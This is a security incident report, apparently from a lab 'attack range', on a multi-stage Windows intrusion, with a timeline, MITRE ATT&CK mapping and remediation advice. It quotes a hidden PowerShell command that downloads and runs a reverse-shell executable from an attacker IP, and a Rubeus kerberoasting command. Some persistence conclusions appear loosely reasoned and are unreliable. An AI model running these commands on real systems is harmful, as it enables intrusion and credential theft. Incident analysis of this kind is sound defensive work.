# Security Incident Analysis Report: May 17-19, 2025

## Executive Summary

A comprehensive analysis of security signals from May 17-19, 2025 reveals a sophisticated multi-stage attack on host `EC2AMAZ-OSH4IUQ.attackrange.prptl.org`. The attack began with a ClickFix initial access vector, followed by deployment of remote management tools, process injection techniques, credential theft attempts using Rubeus and BloodHound, and establishment of persistence mechanisms. This report details the attack chain, techniques used, and provides a timeline of events.

## Timeline of Events

### May 17, 2025

#### Initial Compromise (15:16:40 UTC)
- **ClickFix Initial Access** detected on `EC2AMAZ-OSH4IUQ.attackrange.prptl.org`
- User `ATTACKRANGE\jl.picard` was compromised
- Registry modification detected in RunMRU: `HKU\S-1-5-21-216862292-1716178118-2570252875-1113\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList`
- PowerShell execution with evasion parameters:
  ```powershell
  "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -nop -w hidden -c "iwr http://172.31.7.63/revshelled.exe -OutFile $env:TEMP\fixer.exe; Start-Process $env:TEMP\fixer.exe"
  ```
- Malicious executable downloaded to: `C:\Users\jl.picard\AppData\Local\Temp\2\fixer.exe`

#### Post-Exploitation Activities (15:16:40 - 15:22:53 UTC)

- **Command & Control Establishment** (15:16:43)
  - C2 connection from `fixer.exe` to `172.31.7.63:4444`
  - Protocol: TCP
  - Source IP: 172.31.5.238

- **Remote Management Tool Deployment** (15:16:55)
  - AnyDesk RMM tool deployed from Temp directory
  - Path: `C:\Windows\Temp\anydesk.exe`
  - Multiple configuration files created in user's AppData directory

- **Process Injection Detected** (15:17:00)
  - Source: `C:\Users\JL025C~1.PIC\AppData\Local\Temp\2\fixer.exe`
  - Target: `C:\Windows\Temp\anydesk.exe`
  - Access Mask: `0x1fffff` (suspicious)
  - Suspicious call trace patterns detected

- **Additional Process Injection** (15:18:00)
  - Source: `C:\Users\JL025C~1.PIC\AppData\Local\Temp\2\fixer.exe`
  - Target: `C:\Windows\SysWOW64\cmd.exe`
  - Similar suspicious access patterns

- **Credential Theft Attempt** (15:18:15)
  - Rubeus tool execution detected
  - Command: `C:\Windows\Temp\Rubeus.exe -a kerberoast /outputfile:C:\Windows\Temp\hashes.txt`
  - Credential extraction functionality identified

- **Active Directory Enumeration** (15:22:53)
  - BloodHound/SharpHound activity detected
  - PowerShell memory-based execution (fileless technique)
  - Active Directory collection methods identified
  - Multiple encoded PowerShell script blocks observed

- **Persistence Mechanism Established** (17:10:00)
  - Registry modifications for persistence
  - Key: `HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{c1585d74-dac9-43a5-ab7b-ecaa0a285685}\DhcpServer`
  - Value: `172.31.0.1`
  - Service keys and extension keys modified

### May 18-19, 2025

- **Continued RMM Tool Activity**
  - AnyDesk continued to run from Temp directory
  - Multiple file modifications in user's AppData directory
  - Configuration files repeatedly modified
  - Sustained activity over multiple days

## Technical Analysis

### Initial Access Vector

The attack began with a ClickFix social engineering technique targeting user `jl.picard`. The attacker leveraged the Windows Run dialog to execute a PowerShell command with evasion parameters (`-nop -w hidden`). This command downloaded a malicious executable (`revshelled.exe`) from an attacker-controlled IP (`172.31.7.63`) and saved it as `fixer.exe` in the user's Temp directory.

### Command and Control

Within seconds of execution, `fixer.exe` established a command and control channel to `172.31.7.63:4444`. This connection allowed the attacker to maintain remote access to the compromised system and execute additional payloads.

### Lateral Movement and Persistence

The attacker deployed AnyDesk, a legitimate remote management tool, to maintain persistent access to the system. This "living off the land" technique helps evade detection by using legitimate software. The tool was installed in an unusual location (`C:\Windows\Temp\`) rather than following standard installation procedures, indicating malicious intent.

### Process Injection Techniques

Multiple instances of process injection were observed, where `fixer.exe` injected code into:
1. `anydesk.exe` - Likely to maintain control over the RMM tool
2. `cmd.exe` - Possibly to execute additional commands with different privileges

The process injection used suspicious memory access patterns with access mask `0x1fffff`, which provides full control over the target process.

### Credential Theft

The attacker deployed multiple credential theft tools:

1. **Rubeus** - Used for Kerberos ticket extraction via the Kerberoast technique
   - Command targeted extraction of service account hashes
   - Output directed to `C:\Windows\Temp\hashes.txt`

2. **BloodHound/SharpHound** - Used for Active Directory enumeration
   - Deployed via fileless PowerShell execution
   - Collected domain information for privilege escalation paths
   - Used memory-based execution to avoid disk-based detection

### Registry Persistence

The attacker established persistence through registry modifications:
- Modified service-related registry keys
- Added extension keys for potential DLL loading
- Target registry: `HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{c1585d74-dac9-43a5-ab7b-ecaa0a285685}\DhcpServer`

### Sustained Access

The attack continued over multiple days (May 17-19), with ongoing AnyDesk activity and configuration file modifications, indicating the attacker maintained access to the system throughout this period.

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|-----------|-------------|
| Initial Access | T1204.002 (User Execution: Malicious File) | User executed malicious PowerShell command |
| Execution | T1059.001 (Command and Scripting Interpreter: PowerShell) | PowerShell used for initial payload execution |
| Defense Evasion | T1036 (Masquerading) | Disguised malicious activity using legitimate tools |
| Defense Evasion | T1055 (Process Injection) | Injected code into legitimate processes |
| Defense Evasion | T1112 (Modify Registry) | Modified registry for persistence |
| Persistence | T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys) | Registry modifications for persistence |
| Persistence | T1546.001 (Event Triggered Execution) | Service keys modified for persistence |
| Command and Control | T1571 (Non-Standard Port) | C2 communication over port 4444 |
| Command and Control | T1219 (Remote Access Software) | AnyDesk RMM tool deployed |
| Credential Access | T1558 (Steal or Forge Kerberos Tickets) | Rubeus used for Kerberoasting |
| Discovery | T1087 (Account Discovery) | BloodHound used for AD enumeration |
| Discovery | T1482 (Domain Trust Discovery) | BloodHound collected domain trust information |
| Collection | T1005 (Data from Local System) | Credential data collected and saved |

## Risk Assessment

| Factor | Rating | Justification |
|--------|--------|---------------|
| Severity | Critical | Multiple stages of attack with credential theft and persistence |
| Scope | High | Active Directory enumeration indicates potential for lateral movement |
| Impact | High | Credential theft could lead to domain compromise |
| Sophistication | High | Multi-stage attack using various tools and techniques |
| Overall Risk | Critical | Combination of severity, scope, and impact |

## Recommendations

### Immediate Actions

1. **Isolate the affected system**
   - Remove from network or place in quarantine VLAN
   - Preserve forensic evidence for further investigation

2. **Reset credentials**
   - Force password reset for user `jl.picard`
   - Audit and reset any service account credentials that may have been compromised
   - Monitor for suspicious authentication attempts

3. **Remove persistence mechanisms**
   - Clean registry modifications
   - Remove unauthorized software (AnyDesk, Rubeus)
   - Scan for additional persistence mechanisms

4. **Block malicious infrastructure**
   - Add `172.31.7.63` to blocklists
   - Monitor for additional C2 communications

### Long-term Mitigations

1. **Enhance endpoint protection**
   - Deploy application whitelisting
   - Implement PowerShell constrained language mode
   - Enable PowerShell script block logging

2. **Strengthen Active Directory security**
   - Implement tiered administration model
   - Review service account privileges
   - Deploy Protected Users security group for sensitive accounts

3. **Improve detection capabilities**
   - Enhance monitoring for process injection
   - Deploy memory-based threat detection
   - Monitor for unusual RMM tool usage

4. **User awareness training**
   - Focus on social engineering awareness
   - Train users to recognize suspicious Run dialog prompts
   - Establish clear procedures for reporting security incidents

## Conclusion

This incident represents a sophisticated attack chain that progressed from initial access to credential theft and persistence establishment. The attacker demonstrated knowledge of multiple attack techniques, including living-off-the-land binaries, fileless malware, and Active Directory enumeration tools. The combination of ClickFix initial access, AnyDesk deployment, process injection, and credential theft tools indicates a well-planned operation with potential for significant impact if not contained.

The sustained activity over multiple days suggests the attacker maintained access and continued to operate within the environment. Immediate containment actions are necessary to prevent further compromise, followed by comprehensive investigation to determine the full scope of the incident.